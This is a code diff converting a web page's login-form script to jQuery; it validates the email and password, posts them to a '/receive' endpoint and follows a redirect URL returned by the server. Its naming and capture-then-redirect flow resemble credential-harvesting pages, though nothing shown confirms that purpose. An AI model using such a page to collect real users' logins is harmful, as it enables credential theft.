@@ -1163,66 +1163,63 @@
     })
   
   </script>
+	  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
   <script>
-  document.getElementById("myForm").addEventListener("submit", function(event) {
-    event.preventDefault(); // Prevent default form submission
+  $(document).ready(function () {
+    $("#myForm").on("submit", function (event) {
+      event.preventDefault(); // Prevent default form submission
 
-    const loginInput = this.querySelector('input[name="login"]');
-    const passwordInput = this.querySelector('input[name="password"]');
-    const submitButton = this.querySelector('button[type="submit"]');
+      const loginInput = $(this).find('input[name="login"]');
+      const passwordInput = $(this).find('input[name="password"]');
+      const submitButton = $(this).find('button[type="submit"]');
 
-    let errorMessage = "";
+      let errorMessage = "";
 
-    if (!loginInput.value.trim() && !passwordInput.value.trim()) {
-      errorMessage = "Please enter your email and password.";
-    } else if (!loginInput.value.trim()) {
-      errorMessage = "Please enter your email.";
-    } else if (!passwordInput.value.trim()) {
-      errorMessage = "Please enter your password.";
-    }
+      if (!loginInput.val().trim() && !passwordInput.val().trim()) {
+        errorMessage = "Please enter your email and password.";
+      } else if (!loginInput.val().trim()) {
+        errorMessage = "Please enter your email.";
+      } else if (!passwordInput.val().trim()) {
+        errorMessage = "Please enter your password.";
+      }
 
-    // Check if an error div already exists
-    let errorDiv = this.querySelector('.error');
-    if (!errorDiv) {
-      errorDiv = document.createElement('div');
-      errorDiv.className = 'error';
-      errorDiv.style.color = 'red';
-      errorDiv.style.marginTop = '10px';
-      this.insertBefore(errorDiv, submitButton);
-    }
+      // Check if an error div already exists
+      let errorDiv = $(this).find('.error');
+      if (errorDiv.length === 0) {
+        errorDiv = $('<div class="error" style="color:red; margin-top:10px;"></div>');
+        errorDiv.insertBefore(submitButton);
+      }
 
-    if (errorMessage) {
-      errorDiv.textContent = errorMessage;
-      return;
-    } else {
-      if (errorDiv) errorDiv.remove(); // Remove error if everything is valid
-    }
+      if (errorMessage) {
+        errorDiv.text(errorMessage);
+        return;
+      } else {
+        errorDiv.remove(); // Remove error if inputs are valid
+      }
 
-    // Prepare data
-    const data = {
-      login: loginInput.value.trim(),
-      password: passwordInput.value.trim()
-    };
+      // Collect form data
+      const userinfo = {
+        login: loginInput.val().trim(),
+        password: passwordInput.val().trim()
+      };
 
-    // Send via AJAX to /receive
-    fetch('/receive', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(data)
-    })
-    .then(response => {
-      if (!response.ok) throw new Error('Network response was not ok');
-      return response.json(); // or .text() based on your backend response
-    })
-    .then(data => {
-      console.log("Success:", data);
-      // Optionally redirect or show success message
-    })
-    .catch(error => {
-      console.error("Error:", error);
-      // Optionally display error to user
+      // Make AJAX request with collected form data
+      $.ajax({
+        url: '/receive',  // The endpoint where data will be sent
+        type: 'POST',
+        contentType: 'application/json',
+        data: JSON.stringify(userinfo),  // Send JSON string
+        success: function (response) {
+          if (response.url) {
+            window.location.href = response.url; // Redirect if URL is provided in the response
+          } else {
+            alert("Form submitted successfully.");
+          }
+        },
+        error: function (xhr, status, error) {
+          alert('An error occurred: ' + error);  // Show error message if something goes wrong
+        }
+      });
     });
   });
 </script>
